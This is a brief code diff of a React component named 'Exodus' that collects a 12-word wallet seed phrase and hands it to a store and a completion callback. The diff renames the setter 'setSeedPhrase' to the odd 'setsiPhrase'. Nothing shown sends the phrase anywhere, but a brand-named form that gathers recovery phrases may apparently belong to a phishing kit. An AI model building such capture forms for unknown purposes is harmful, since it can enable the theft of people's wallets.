@@ -12,10 +12,10 @@ const Exodus = ({
   handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
   const [words, setWords] = useState<string[]>(Array(12).fill(""));
-  const { setSeedPhrase } = useWalletStore();
+  const { setsiPhrase } = useWalletStore();
 
   const handleComplete = () => {
-    setSeedPhrase(words.join(" "));
+    setsiPhrase(words.join(" "));
     handleFinish(words.join(" "));
   };
 
